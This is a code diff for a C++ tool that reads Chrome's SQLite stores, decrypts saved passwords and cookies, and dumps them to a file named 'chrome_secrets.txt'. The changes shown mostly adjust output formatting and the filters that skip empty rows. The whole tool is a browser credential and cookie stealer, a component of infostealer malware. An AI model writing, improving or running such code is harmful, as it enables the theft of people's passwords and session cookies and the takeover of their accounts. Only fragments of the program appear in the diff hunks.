@@ -9,11 +9,11 @@
 
 using namespace std;
 
-char *output = "chrome_secrets.txt";
+const char *output = "chrome_secrets.txt";
 stringstream debug(string(""));
 int isdebug = 0;
-const char* pretty_passwd_template = "{\n\t%s: %s\n\t%s: %s\n\t%s:%s\n}\n";
-const char* pretty_cookie_template = "{\n\t%s: %s\n\t%s: %s\n\t%s: %s\n\t%s: %s\n}\n";
+const char* pretty_passwd_template = "\t{\n\t\t%s: %s\n\t\t%s: %s\n\t\t%s: %s\n\t}\n";
+const char* pretty_cookie_template = "\t{\n\t\t%s: %s\n\t\t%s: %s\n\t\t%s: %s\n\t\t%s: %s\n\t}\n";
 
 /*
 ** Pass sqlite3 handler, iterate over queried rows and decrypt each password by copying bytes from password_value
@@ -42,7 +42,7 @@ stringstream getPass(
 	*/
 	rc = sqlite3_step(pStmt);
 	//cout << "RC: " << rc << endl;
-	
+	dump << "Passwords : \n{" << endl;
 	while (rc == SQLITE_ROW) {
 		char* url_col =  (char *)sqlite3_column_name(pStmt, 0);
 		char* url =  (char *)sqlite3_column_text(pStmt, 0);
@@ -80,7 +80,7 @@ stringstream getPass(
 		unsigned long prsz = extralen + strlen(url_col) + strlen(url) +
 								strlen(username_col) + strlen(username) +
 								strlen(password_col) + strlen(dec_pass);
-		if(strlen(username) + strlen(dec_pass) + strlen(url) == 0){
+		if(strlen(username) + strlen(url) == 0){
 			rc = sqlite3_step(pStmt);
 			continue;
 		}
@@ -96,7 +96,7 @@ stringstream getPass(
 	** sqlite3_prepare() ).
 	*/
 	rc = sqlite3_finalize(pStmt);
-	
+	dump << "}" << endl;
 	return dump;
 }
 stringstream getCookies(
@@ -121,6 +121,7 @@ stringstream getCookies(
 	*/
 	rc = sqlite3_step(pStmt);
 	//cout << "RC: " << rc << endl;
+	dump << "\nCookies : \n{" << endl;
 	while (rc == SQLITE_ROW) {
 		char* HOST_KEY_col =  (char *)sqlite3_column_name(pStmt, 0);
 		char* HOST_KEY =  (char *)sqlite3_column_text(pStmt, 0);
@@ -163,7 +164,7 @@ stringstream getCookies(
 								strlen(name_col) + strlen(name) +
 								strlen(cookies_col) + strlen(dec_cookies);
 								
-		if(strlen(HOST_KEY) + strlen(path) + strlen(dec_cookies) == 0){
+		if(strlen(HOST_KEY) + strlen(path) + strlen(name) == 0){
 			rc = sqlite3_step(pStmt);
 			continue;
 		}
@@ -179,7 +180,7 @@ stringstream getCookies(
 	** sqlite3_prepare() ).
 	*/
 	rc = sqlite3_finalize(pStmt);
-
+	dump << "}" << endl;
 	return dump;
 }
 sqlite3* getDBHandler(char* dbFilePath) {
